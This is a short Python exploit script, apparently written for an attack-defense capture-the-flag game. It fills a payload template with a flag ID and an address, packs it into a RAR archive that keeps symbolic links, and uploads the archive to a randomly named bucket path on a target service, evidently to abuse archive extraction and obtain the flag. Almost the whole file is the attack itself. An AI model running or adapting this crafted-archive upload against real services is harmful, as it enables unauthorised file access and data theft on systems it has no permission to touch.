#!/usr/bin/python3

from pathlib import Path

import random
import requests
import string
import subprocess
import sys

(BASE_URL, ADDRESS, FLAG_ID) = sys.argv[1:4]
ARCHIVE = "hack.rar"

payload = Path("payload.template").read_text()
Path("Prog").write_text(payload.format(__BUCKET__=FLAG_ID, __ADDRESS__=ADDRESS))

subprocess.run(args=f"rar u -ol -ai -cl {ARCHIVE} Prog", shell=True)

b = ''.join(random.choices(string.ascii_lowercase + string.digits, k=5))
url = f"{BASE_URL}bucket/~{b}"
r = requests.post(url, files={"input": Path(ARCHIVE).open(mode="rb")})
print(r.status_code)
